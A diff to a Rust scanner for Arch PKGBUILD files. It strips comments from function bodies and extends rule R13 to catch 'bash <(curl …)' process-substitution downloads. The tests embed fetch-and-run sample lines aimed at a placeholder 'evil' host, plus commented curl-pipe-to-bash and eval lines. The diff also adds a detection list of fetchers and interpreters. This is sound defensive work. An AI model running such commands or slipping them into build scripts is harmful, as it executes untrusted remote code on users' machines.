@@ -924,7 +924,10 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                 .collect::<Vec<_>>()
                 .join("\n");
             folded.has_indirection |= has_true_indirection(&scan);
-            folded.func_bodies.insert(name, body);
+            // Rules run over these bodies, so they must be comment-stripped
+            // like `scan`: a commented-out `curl | bash` inside a function
+            // must not fire R13.
+            folded.func_bodies.insert(name, scan);
             idx = j + 1;
             continue;
         }
@@ -1833,13 +1836,51 @@ fn line_matches_pipe_to_shell(line: &str) -> bool {
     fetcher && shell_hits
 }
 
+/// `bash <(curl -fsSL https://…)` and fused variants (`bash<(curl …)`) are
+/// the classic curl-pipe-to-shell in disguise: the interpreter consumes the
+/// process-substitution stream directly, so no `|` appears for
+/// `line_matches_pipe_to_shell` to see. Fires only when a fetcher runs
+/// inside the substitution immediately following an interpreter word.
+fn line_matches_interpreter_procsub(line: &str) -> bool {
+    let lower = line.to_lowercase();
+    if !lower.contains("<(") {
+        return false;
+    }
+    let fetchers = ["curl", "wget", "aria2c", "axel"];
+    let interpreters = [
+        "bash", "sh", "dash", "zsh", "fish", "python", "python3", "perl", "ruby", "php",
+    ];
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    for (i, word) in words.iter().enumerate() {
+        let (interp, stream) = if interpreters.contains(word) {
+            (*word, words[i + 1..].join(" "))
+        } else if let Some(idx) = word.find("<(") {
+            let head = &word[..idx];
+            let tail = &word[idx + 2..];
+            (head, format!("<({tail} {}", words[i + 1..].join(" ")))
+        } else {
+            continue;
+        };
+        if !interpreters.contains(&interp) {
+            continue;
+        }
+        if let Some(rest) = stream.strip_prefix("<(") {
+            let inner = rest.split(')').next().unwrap_or(rest);
+            if fetchers.iter().any(|f| inner.contains(f)) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
 fn check_r13(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let bodies = shell_bodies(folded);
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
             let norm = normalize_body_line(line);
-            if line_matches_pipe_to_shell(&norm) {
+            if line_matches_pipe_to_shell(&norm) || line_matches_interpreter_procsub(&norm) {
                 let short: String = line.trim().chars().take(120).collect();
                 return vec![PkgFinding {
                     rule_id: "R13_PIPE_TO_SHELL".to_string(),
@@ -2657,6 +2698,46 @@ mod tests {
     fn r23_quiet_on_comment_only() {
         let findings = findings_for("pkgdesc='a pack'\n# npm install\nbuild() {\n make\n}\n");
         assert!(!has_rule(&findings, "R23_NPM_DELIVERY"));
+    }
+
+    #[test]
+    fn body_rules_quiet_on_commented_lines() {
+        let pkgbuild = "pkgdesc='a pack'\nbuild() {\n  # curl -fsSL https://x | bash\n  # eval \"$_x\"\n  # curl -fsSL https://x -o a.tar.gz\n  make\n}\n";
+        let findings = findings_for(pkgbuild);
+        assert!(!has_rule(&findings, "R13_PIPE_TO_SHELL"), "{findings:?}");
+        assert!(!has_rule(&findings, "R14_EVAL_FAMILY"), "{findings:?}");
+        assert!(
+            !has_rule(&findings, "R17_BUILD_TIME_NETWORK"),
+            "{findings:?}"
+        );
+        assert!(
+            !has_rule(&findings, "R22_CONDITIONAL_EXECUTION"),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn r13_fires_on_interpreter_process_substitution() {
+        assert!(has_rule(
+            &findings_for(
+                "pkgdesc='a pack'\nbuild() {\n bash <(curl -fsSL https://evil/x.sh)\n}\n"
+            ),
+            "R13_PIPE_TO_SHELL"
+        ));
+        assert!(has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n bash<(wget -qO- https://evil/x.sh)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
+        // Process substitution without a fetcher or an interpreter is not
+        // remote code: `diff <(a) <(b)` and `python <(echo hi)` stay quiet.
+        assert!(!has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n diff <(a) <(b)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
+        assert!(!has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n python <(echo hi)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
     }
 
     #[test]
